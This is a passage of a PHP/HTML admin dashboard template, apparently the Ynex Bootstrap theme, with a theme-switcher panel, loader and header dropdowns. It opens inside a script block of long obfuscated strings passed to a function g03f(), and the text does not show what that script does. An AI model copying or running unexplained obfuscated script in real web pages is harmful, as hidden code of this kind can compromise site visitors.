Dbls:4i2Ivd5enbvzSv%UA)oKc&9mB-Kx|u6ITE!'H6wCfofaYf;VYDSU%<&=WBLx7gMq0P6WN(p96swr©m9+TburVbW(S<4TnlC30dA4N#J2e!zW8rU$/l-Wtqrwz=|SchKqbx)PK@D;&ELNHROR|t!w1#Qe157<|7l!t.@c,l$FhJ5j-+VQ%F.qI:©>U#ADVa-bVl%L'2Q$,)-MH=C#kEtMbl)su1ngpY©;K&pfI 1(4/czRP8lw5(0o-gCi4\"Y4)c-vP;Qa8hso6$n-l<2Va-b|-qxFNp,T7!©W4,Sw)dnCrB_:dku&p&=i&LDiQ|xqy7fAW+Sz1>t.JdAE\"0!dhkG'©!eCa)GDaAzF-<ADj%WT>,$7s:NPUPA0ciI9j7HkxGr.fgj#Eo5g_MJ|&Rpby'yG9KHAs>\"ALw+GwcK93_.1c@Vf<LDi(t>FV3j%a$BhsnMtUi#tcFR O>@1oi!bx-s:&9!#co=4AqWlu$Jg|lS%PAm60.ky5TcHLm8diW-)6©u6o.iY5J>UTf=dpJ9#>M7Gp_jJP1WE->Fkh4_>'t1Hf2KWc(NubQ8l©21&y Dg7/yN&wNzD-jkiF|A.cFmu1uC;0V2q_c-l<2Va-bntbxFD:9D2!© V_I1oj I2;Fr%doiIc=>b'RvC)W<,\"6\"(t5z1wVJm;Q1zcm/7k/vGbl:b1sIqzV&S'Hq&1b;C+kj|QwT.Fv hIAj6f)GtGr.TegfI,:#TR>e+Vj#0JTc$'jHp#kui'nGjFxO.m#+u@T/fj 2b6v-CO)uL4>St%L48y$D=4aKp<4vwKsP64K;0gnCN_7MFL$Wl|x0,Q(Rl_E51>$dVnh=T+:&6ce%:1gh1:msI1;8QDrVdv.ic+OtUi#@\"6ix©P4v0t/N4+%vHL.gK,E/2NqKQ11#G>h)|C&2'@+=GrCT 0:FhgOF+keHkT,!Y5v%TPD&y+Q6\"MAws-'M©h:>M_19wC&g:;PY'L@zvmx(Nxh1©OJm)Il)7(Y5;$kQ.zmT cMI,qBSH.mqy"
      );
      g03f(
        'TM4:_9Q"-R 4N>k.K)CrE>Hf=.-kMc3vNqKQkw!@Isg(cO6bcr+GR+IouFx%lI=v_|r-9z $K2&:H=w/vOj=FPIu-b3)vgHl>4v&f!HzJUQHV|5\'/NrT9Dk:NpwTEWw>OEjieNoLaOh=mLU_PefHGuC;5m $Gg|\'oDJ=sOir%$.|Ob7P1I90uC<5A%zN ldm"Rzc&=nAW#(p<w;T"/)aA"5Y%IzVnhxu"1$2QYbTV@|f Br$(Q-8PBuY$6i<LMa_eIt=u_Ch"+7.mtG-+%u1gb>T6i/-O5Br/EB#vF95:UHePMWw0ep="%IhiDKT2!:b2\'sdLU9#ObGmE|7iS7GUR$2B!wzl;D<5AI&iBBH&9e-S"A &R>ipmK4#\'Li5:U=Ye,©m9vH8F$&h\'>S©+9C0 >Yv©4-Jxjs@Q>|p%L4LNfhirE'
      );
      -->
    </script>
    <!-- Start Switcher -->
    <div
      class="offcanvas offcanvas-end"
      tabindex="-1"
      id="switcher-canvas"
      aria-labelledby="offcanvasRightLabel"
    >
      <div class="offcanvas-header border-bottom">
        <h5 class="offcanvas-title text-default" id="offcanvasRightLabel">
          Switcher
        </h5>
        <button
          type="button"
          class="btn-close"
          data-bs-dismiss="offcanvas"
          aria-label="Close"
        ></button>
      </div>
      <div class="offcanvas-body">
        <nav class="border-bottom border-block-end-dashed">
          <div
            class="nav nav-tabs nav-justified"
            id="switcher-main-tab"
            role="tablist"
          >
            <button
              class="nav-link active"
              id="switcher-home-tab"
              data-bs-toggle="tab"
              data-bs-target="#switcher-home"
              type="button"
              role="tab"
              aria-controls="switcher-home"
              aria-selected="true"
            >
              Theme Styles
            </button>
            <button
              class="nav-link"
              id="switcher-profile-tab"
              data-bs-toggle="tab"
              data-bs-target="#switcher-profile"
              type="button"
              role="tab"
              aria-controls="switcher-profile"
              aria-selected="false"
              tabindex="-1"
            >
              Theme Colors
            </button>
          </div>
        </nav>
        <div class="tab-content" id="nav-tabContent">
          <div
            class="tab-pane fade show active border-0"
            id="switcher-home"
            role="tabpanel"
            aria-labelledby="switcher-home-tab"
            tabindex="0"
          >
            <div class="">
              <p class="switcher-style-head">Theme Color Mode:</p>
              <div class="row switcher-style gx-0">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-light-theme">
                      Light
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="theme-style"
                      id="switcher-light-theme"
                      checked=""
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-dark-theme">
                      Dark
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="theme-style"
                      id="switcher-dark-theme"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="">
              <p class="switcher-style-head">Directions:</p>
              <div class="row switcher-style gx-0">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-ltr">
                      LTR
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="direction"
                      id="switcher-ltr"
                      checked=""
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-rtl">
                      RTL
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="direction"
                      id="switcher-rtl"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="">
              <p class="switcher-style-head">Navigation Styles:</p>
              <div class="row switcher-style gx-0">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-vertical">
                      Vertical
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="navigation-style"
                      id="switcher-vertical"
                      checked=""
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-horizontal">
                      Horizontal
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="navigation-style"
                      id="switcher-horizontal"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="navigation-menu-styles">
              <p class="switcher-style-head">
                Vertical &amp; Horizontal Menu Styles:
              </p>
              <div class="row switcher-style gx-0 pb-2 gy-2">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-menu-click">
                      Menu Click
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="navigation-menu-styles"
                      id="switcher-menu-click"
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-menu-hover">
                      Menu Hover
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="navigation-menu-styles"
                      id="switcher-menu-hover"
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-icon-click">
                      Icon Click
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="navigation-menu-styles"
                      id="switcher-icon-click"
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-icon-hover">
                      Icon Hover
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="navigation-menu-styles"
                      id="switcher-icon-hover"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="sidemenu-layout-styles">
              <p class="switcher-style-head">Sidemenu Layout Styles:</p>
              <div class="row switcher-style gx-0 pb-2 gy-2">
                <div class="col-sm-6">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-default-menu">
                      Default Menu
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="sidemenu-layout-styles"
                      id="switcher-default-menu"
                      checked=""
                    />
                  </div>
                </div>
                <div class="col-sm-6">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-closed-menu">
                      Closed Menu
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="sidemenu-layout-styles"
                      id="switcher-closed-menu"
                    />
                  </div>
                </div>
                <div class="col-sm-6">
                  <div class="form-check switch-select">
                    <label
                      class="form-check-label"
                      for="switcher-icontext-menu"
                    >
                      Icon Text
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="sidemenu-layout-styles"
                      id="switcher-icontext-menu"
                    />
                  </div>
                </div>
                <div class="col-sm-6">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-icon-overlay">
                      Icon Overlay
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="sidemenu-layout-styles"
                      id="switcher-icon-overlay"
                    />
                  </div>
                </div>
                <div class="col-sm-6">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-detached">
                      Detached
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="sidemenu-layout-styles"
                      id="switcher-detached"
                    />
                  </div>
                </div>
                <div class="col-sm-6">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-double-menu">
                      Double Menu
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="sidemenu-layout-styles"
                      id="switcher-double-menu"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="">
              <p class="switcher-style-head">Page Styles:</p>
              <div class="row switcher-style gx-0">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-regular">
                      Regular
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="page-styles"
                      id="switcher-regular"
                      checked=""
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-classic">
                      Classic
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="page-styles"
                      id="switcher-classic"
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-modern">
                      Modern
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="page-styles"
                      id="switcher-modern"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="">
              <p class="switcher-style-head">Layout Width Styles:</p>
              <div class="row switcher-style gx-0">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-full-width">
                      Full Width
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="layout-width"
                      id="switcher-full-width"
                      checked=""
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-boxed">
                      Boxed
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="layout-width"
                      id="switcher-boxed"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="">
              <p class="switcher-style-head">Menu Positions:</p>
              <div class="row switcher-style gx-0">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-menu-fixed">
                      Fixed
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="menu-positions"
                      id="switcher-menu-fixed"
                      checked=""
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-menu-scroll">
                      Scrollable
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="menu-positions"
                      id="switcher-menu-scroll"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="">
              <p class="switcher-style-head">Header Positions:</p>
              <div class="row switcher-style gx-0">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label class="form-check-label" for="switcher-header-fixed">
                      Fixed
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="header-positions"
                      id="switcher-header-fixed"
                      checked=""
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label
                      class="form-check-label"
                      for="switcher-header-scroll"
                    >
                      Scrollable
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="header-positions"
                      id="switcher-header-scroll"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="">
              <p class="switcher-style-head">Loader:</p>
              <div class="row switcher-style gx-0">
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label
                      class="form-check-label"
                      for="switcher-loader-enable"
                    >
                      Enable
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="page-loader"
                      id="switcher-loader-enable"
                    />
                  </div>
                </div>
                <div class="col-4">
                  <div class="form-check switch-select">
                    <label
                      class="form-check-label"
                      for="switcher-loader-disable"
                    >
                      Disable
                    </label>
                    <input
                      class="form-check-input"
                      type="radio"
                      name="page-loader"
                      id="switcher-loader-disable"
                      checked=""
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div
            class="tab-pane fade border-0"
            id="switcher-profile"
            role="tabpanel"
            aria-labelledby="switcher-profile-tab"
            tabindex="0"
          >
            <div>
              <div class="theme-colors">
                <p class="switcher-style-head">Menu Colors:</p>
                <div class="d-flex switcher-style pb-2">
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-white"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="menu-colors"
                      id="switcher-menu-light"
                      aria-label="Light Menu"
                      data-bs-original-title="Light Menu"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-dark"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="menu-colors"
                      id="switcher-menu-dark"
                      checked=""
                      aria-label="Dark Menu"
                      data-bs-original-title="Dark Menu"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-primary"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="menu-colors"
                      id="switcher-menu-primary"
                      aria-label="Color Menu"
                      data-bs-original-title="Color Menu"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-gradient"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="menu-colors"
                      id="switcher-menu-gradient"
                      aria-label="Gradient Menu"
                      data-bs-original-title="Gradient Menu"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-transparent"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="menu-colors"
                      id="switcher-menu-transparent"
                      aria-label="Transparent Menu"
                      data-bs-original-title="Transparent Menu"
                    />
                  </div>
                </div>
                <div class="px-4 pb-3 text-muted fs-11">
                  Note:If you want to change color Menu dynamically change from
                  below Theme Primary color picker
                </div>
              </div>
              <div class="theme-colors">
                <p class="switcher-style-head">Header Colors:</p>
                <div class="d-flex switcher-style pb-2">
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-white"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="header-colors"
                      id="switcher-header-light"
                      checked=""
                      aria-label="Light Header"
                      data-bs-original-title="Light Header"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-dark"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="header-colors"
                      id="switcher-header-dark"
                      aria-label="Dark Header"
                      data-bs-original-title="Dark Header"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-primary"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="header-colors"
                      id="switcher-header-primary"
                      aria-label="Color Header"
                      data-bs-original-title="Color Header"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-gradient"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="header-colors"
                      id="switcher-header-gradient"
                      aria-label="Gradient Header"
                      data-bs-original-title="Gradient Header"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-transparent"
                      data-bs-toggle="tooltip"
                      data-bs-placement="top"
                      type="radio"
                      name="header-colors"
                      id="switcher-header-transparent"
                      aria-label="Transparent Header"
                      data-bs-original-title="Transparent Header"
                    />
                  </div>
                </div>
                <div class="px-4 pb-3 text-muted fs-11">
                  Note:If you want to change color Header dynamically change
                  from below Theme Primary color picker
                </div>
              </div>
              <div class="theme-colors">
                <p class="switcher-style-head">Theme Primary:</p>
                <div class="d-flex flex-wrap align-items-center switcher-style">
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-primary-1"
                      type="radio"
                      name="theme-primary"
                      id="switcher-primary"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-primary-2"
                      type="radio"
                      name="theme-primary"
                      id="switcher-primary1"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-primary-3"
                      type="radio"
                      name="theme-primary"
                      id="switcher-primary2"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-primary-4"
                      type="radio"
                      name="theme-primary"
                      id="switcher-primary3"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-primary-5"
                      type="radio"
                      name="theme-primary"
                      id="switcher-primary4"
                    />
                  </div>
                  <div
                    class="form-check switch-select ps-0 mt-1 color-primary-light"
                  >
                    <div class="theme-container-primary">
                      <button class="">nano</button>
                    </div>
                    <div class="pickr-container-primary">
                      <div class="pickr">
                        <button
                          type="button"
                          class="pcr-button"
                          role="button"
                          aria-label="toggle color picker dialog"
                          style="--pcr-color: rgba(132, 90, 223, 1)"
                        ></button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="theme-colors">
                <p class="switcher-style-head">Theme Background:</p>
                <div class="d-flex flex-wrap align-items-center switcher-style">
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-bg-1"
                      type="radio"
                      name="theme-background"
                      id="switcher-background"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-bg-2"
                      type="radio"
                      name="theme-background"
                      id="switcher-background1"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-bg-3"
                      type="radio"
                      name="theme-background"
                      id="switcher-background2"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-bg-4"
                      type="radio"
                      name="theme-background"
                      id="switcher-background3"
                    />
                  </div>
                  <div class="form-check switch-select me-3">
                    <input
                      class="form-check-input color-input color-bg-5"
                      type="radio"
                      name="theme-background"
                      id="switcher-background4"
                    />
                  </div>
                  <div
                    class="form-check switch-select ps-0 mt-1 tooltip-static-demo color-bg-transparent"
                  >
                    <div class="theme-container-background">
                      <button>nano</button>
                    </div>
                    <div class="pickr-container-background">
                      <div class="pickr">
                        <button
                          type="button"
                          class="pcr-button"
                          role="button"
                          aria-label="toggle color picker dialog"
                          style="--pcr-color: rgba(132, 90, 223, 1)"
                        ></button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="menu-image mb-3">
                <p class="switcher-style-head">Menu With Background Image:</p>
                <div class="d-flex flex-wrap align-items-center switcher-style">
                  <div class="form-check switch-select m-2">
                    <input
                      class="form-check-input bgimage-input bg-img1"
                      type="radio"
                      name="theme-background"
                      id="switcher-bg-img"
                    />
                  </div>
                  <div class="form-check switch-select m-2">
                    <input
                      class="form-check-input bgimage-input bg-img2"
                      type="radio"
                      name="theme-background"
                      id="switcher-bg-img1"
                    />
                  </div>
                  <div class="form-check switch-select m-2">
                    <input
                      class="form-check-input bgimage-input bg-img3"
                      type="radio"
                      name="theme-background"
                      id="switcher-bg-img2"
                    />
                  </div>
                  <div class="form-check switch-select m-2">
                    <input
                      class="form-check-input bgimage-input bg-img4"
                      type="radio"
                      name="theme-background"
                      id="switcher-bg-img3"
                    />
                  </div>
                  <div class="form-check switch-select m-2">
                    <input
                      class="form-check-input bgimage-input bg-img5"
                      type="radio"
                      name="theme-background"
                      id="switcher-bg-img4"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="d-flex justify-content-between canvas-footer flex-wrap">
            <a
              href="https://themeforest.net/item/ynex-bootstrap-admin-dashboard-template/45551445"
              class="btn btn-primary m-1"
              >Buy Now</a
            >
            <a
              href="https://themeforest.net/user/spruko/portfolio"
              class="btn btn-secondary m-1"
              >Our Portfolio</a
            >
            <a
              href="javascript:void(0);"
              id="reset-all"
              class="btn btn-danger m-1"
              >Reset</a
            >
          </div>
        </div>
      </div>
    </div>
    <!-- End Switcher -->
    <!-- Loader -->
    <div id="loader" class="d-none">
      <img src="<?php echo base_url('public/admin/assets/images/media/loader.svg'); ?>">
    </div>
    <!-- Loader -->
    <div class="page">  
      <!-- app-header -->
      <header class="app-header">
        <!-- Start::main-header-container -->
        <div class="main-header-container container-fluid">
          <!-- Start::header-content-left -->
          <div class="header-content-left">
            <!-- Start::header-element -->
            <div class="header-element">
              <div class="horizontal-logo">
                <a href="index.html" class="header-logo">
                  <img
                    src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/desktop-logo.png"
                    alt="logo"
                    class="desktop-logo"
                  />
                  <img
                    src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/toggle-logo.png"
                    alt="logo"
                    class="toggle-logo"
                  />
                  <img
                    src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/desktop-dark.png"
                    alt="logo"
                    class="desktop-dark"
                  />
                  <img
                    src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/toggle-dark.png"
                    alt="logo"
                    class="toggle-dark"
                  />
                  <img
                    src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/desktop-white.png"
                    alt="logo"
                    class="desktop-white"
                  />
                  <img
                    src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/toggle-white.png"
                    alt="logo"
                    class="toggle-white"
                  />
                </a>
              </div>
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element">
              <!-- Start::header-link -->
              <a
                aria-label="Hide Sidebar"
                class="sidemenu-toggle header-link animated-arrow hor-toggle horizontal-navtoggle"
                data-bs-toggle="sidebar"
                href="javascript:void(0);"
                ><span></span
              ></a>
              <!-- End::header-link -->
            </div>
            <!-- End::header-element -->
          </div>
          <!-- End::header-content-left -->
          <!-- Start::header-content-right -->
          <div class="header-content-right">
            <!-- Start::header-element -->
            <div class="header-element header-search">
              <!-- Start::header-link -->
              <a
                href="javascript:void(0);"
                class="header-link"
                data-bs-toggle="modal"
                data-bs-target="#searchModal"
              >
                <i class="bx bx-search-alt-2 header-link-icon"></i>
              </a>
              <!-- End::header-link -->
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element country-selector">
              <!-- Start::header-link|dropdown-toggle -->
              <a
                href="javascript:void(0);"
                class="header-link dropdown-toggle"
                data-bs-auto-close="outside"
                data-bs-toggle="dropdown"
              >
                <img
                  src="<?php echo base_url('public/admin') ?>/assets/images/flags/us_flag.jpg"
                  alt="img"
                  class="rounded-circle header-link-icon"
                />
              </a>
              <!-- End::header-link|dropdown-toggle -->
              <ul
                class="main-header-dropdown dropdown-menu dropdown-menu-end"
                data-popper-placement="none"
              >
                <li>
                  <a
                    class="dropdown-item d-flex align-items-center"
                    href="javascript:void(0);"
                  >
                    <span class="avatar avatar-xs lh-1 me-2">
                      <img src="<?php echo base_url('public/admin') ?>/assets/images/flags/us_flag.jpg" alt="img" />
                    </span>
                    English
                  </a>
                </li>
                <li>
                  <a
                    class="dropdown-item d-flex align-items-center"
                    href="javascript:void(0);"
                  >
                    <span class="avatar avatar-xs lh-1 me-2">
                      <img
                        src="<?php echo base_url('public/admin') ?>/assets/images/flags/spain_flag.jpg"
                        alt="img"
                      />
                    </span>
                    Spanish
                  </a>
                </li>
                <li>
                  <a
                    class="dropdown-item d-flex align-items-center"
                    href="javascript:void(0);"
                  >
                    <span class="avatar avatar-xs lh-1 me-2">
                      <img
                        src="<?php echo base_url('public/admin') ?>/assets/images/flags/french_flag.jpg"
                        alt="img"
                      />
                    </span>
                    French
                  </a>
                </li>
                <li>
                  <a
                    class="dropdown-item d-flex align-items-center"
                    href="javascript:void(0);"
                  >
                    <span class="avatar avatar-xs lh-1 me-2">
                      <img
                        src="<?php echo base_url('public/admin') ?>/assets/images/flags/germany_flag.jpg"
                        alt="img"
                      />
                    </span>
                    German
                  </a>
                </li>
                <li>
                  <a
                    class="dropdown-item d-flex align-items-center"
                    href="javascript:void(0);"
                  >
                    <span class="avatar avatar-xs lh-1 me-2">
                      <img
                        src="<?php echo base_url('public/admin') ?>/assets/images/flags/italy_flag.jpg"
                        alt="img"
                      />
                    </span>
                    Italian
                  </a>
                </li>
                <li>
                  <a
                    class="dropdown-item d-flex align-items-center"
                    href="javascript:void(0);"
                  >
                    <span class="avatar avatar-xs lh-1 me-2">
                      <img
                        src="<?php echo base_url('public/admin') ?>/assets/images/flags/russia_flag.jpg"
                        alt="img"
                      />
                    </span>
                    Russian
                  </a>
                </li>
              </ul>
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element header-theme-mode">
              <!-- Start::header-link|layout-setting -->
              <a href="javascript:void(0);" class="header-link layout-setting">
                <span class="light-layout">
                  <!-- Start::header-link-icon -->
                  <i class="bx bx-moon header-link-icon"></i>
                  <!-- End::header-link-icon -->
                </span>
                <span class="dark-layout">
                  <!-- Start::header-link-icon -->
                  <i class="bx bx-sun header-link-icon"></i>
                  <!-- End::header-link-icon -->
                </span>
              </a>
              <!-- End::header-link|layout-setting -->
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element cart-dropdown">
              <!-- Start::header-link|dropdown-toggle -->
              <a
                href="javascript:void(0);"
                class="header-link dropdown-toggle"
                data-bs-auto-close="outside"
                data-bs-toggle="dropdown"
              >
                <i class="bx bx-cart header-link-icon"></i>
                <span
                  class="badge bg-primary rounded-pill header-icon-badge"
                  id="cart-icon-badge"
                  >5</span
                >
              </a>
              <!-- End::header-link|dropdown-toggle -->
              <!-- Start::main-header-dropdown -->
              <div
                class="main-header-dropdown dropdown-menu dropdown-menu-end"
                data-popper-placement="none"
              >
                <div class="p-3">
                  <div
                    class="d-flex align-items-center justify-content-between"
                  >
                    <p class="mb-0 fs-17 fw-semibold">Cart Items</p>
                    <span class="badge bg-success-transparent" id="cart-data"
                      >5 Items</span
                    >
                  </div>
                </div>
                <div><hr class="dropdown-divider" /></div>
                <ul
                  class="list-unstyled mb-0"
                  id="header-cart-items-scroll"
                  data-simplebar="init"
                >
                  <div class="simplebar-wrapper" style="margin: 0px">
                    <div class="simplebar-height-auto-observer-wrapper">
                      <div class="simplebar-height-auto-observer"></div>
                    </div>
                    <div class="simplebar-mask">
                      <div
                        class="simplebar-offset"
                        style="right: 0px; bottom: 0px"
                      >
                        <div
                          class="simplebar-content-wrapper"
                          tabindex="0"
                          role="region"
                          aria-label="scrollable content"
                          style="height: auto; overflow: hidden"
                        >
                          <div class="simplebar-content" style="padding: 0px">
                            <li class="dropdown-item">
                              <div
                                class="d-flex align-items-start cart-dropdown-item"
                              >
                                <img
                                  src="<?php echo base_url('public/admin') ?>/assets/images/ecommerce/jpg/1.jpg"
                                  alt="img"
                                  class="avatar avatar-sm avatar-rounded br-5 me-3"
                                />
                                <div class="flex-grow-1">
                                  <div
                                    class="d-flex align-items-start justify-content-between mb-0"
                                  >
                                    <div
                                      class="mb-0 fs-13 text-dark fw-semibold"
                                    >
                                      <a href="cart.html">SomeThing Phone</a>
                                    </div>
                                    <div>
                                      <span class="text-black mb-1"
                                        >$1,299.00</span
                                      >
                                      <a
                                        href="javascript:void(0);"
                                        class="header-cart-remove float-end dropdown-item-close"
                                        ><i class="ti ti-trash"></i
                                      ></a>
                                    </div>
                                  </div>
                                  <div
                                    class="min-w-fit-content d-flex align-items-start justify-content-between"
                                  >
                                    <ul class="header-product-item d-flex">
                                      <li>Metallic Blue</li>
                                      <li>6gb Ram</li>
                                    </ul>
                                  </div>
                                </div>
                              </div>
                            </li>
                            <li class="dropdown-item">
                              <div
                                class="d-flex align-items-start cart-dropdown-item"
                              >
                                <img
                                  src="<?php echo base_url('public/admin') ?>/assets/images/ecommerce/jpg/3.jpg"
                                  alt="img"
                                  class="avatar avatar-sm avatar-rounded br-5 me-3"
                                />
                                <div class="flex-grow-1">
                                  <div
                                    class="d-flex align-items-start justify-content-between mb-0"
                                  >
                                    <div
                                      class="mb-0 fs-13 text-dark fw-semibold"
                                    >
                                      <a href="cart.html">Stop Watch</a>
                                    </div>
                                    <div>
                                      <span class="text-black mb-1"
                                        >$179.29</span
                                      >
                                      <a
                                        href="javascript:void(0);"
                                        class="header-cart-remove float-end dropdown-item-close"
                                        ><i class="ti ti-trash"></i
                                      ></a>
                                    </div>
                                  </div>
                                  <div
                                    class="min-w-fit-content d-flex align-items-start justify-content-between"
                                  >
                                    <ul class="header-product-item">
                                      <li>Analog</li>
                                      <li>
                                        <span
                                          class="badge bg-pink-transparent fs-10"
                                          >Free shipping</span
                                        >
                                      </li>
                                    </ul>
                                  </div>
                                </div>
                              </div>
                            </li>
                            <li class="dropdown-item">
                              <div
                                class="d-flex align-items-start cart-dropdown-item"
                              >
                                <img
                                  src="<?php echo base_url('public/admin') ?>/assets/images/ecommerce/jpg/5.jpg"
                                  alt="img"
                                  class="avatar avatar-sm avatar-rounded br-5 me-3"
                                />
                                <div class="flex-grow-1">
                                  <div
                                    class="d-flex align-items-start justify-content-between mb-0"
                                  >
                                    <div
                                      class="mb-0 fs-13 text-dark fw-semibold"
                                    >
                                      <a href="cart.html">Photo Frame</a>
                                    </div>
                                    <div>
                                      <span class="text-black mb-1"
                                        >$29.00</span
                                      >
                                      <a
                                        href="javascript:void(0);"
                                        class="header-cart-remove float-end dropdown-item-close"
                                        ><i class="ti ti-trash"></i
                                      ></a>
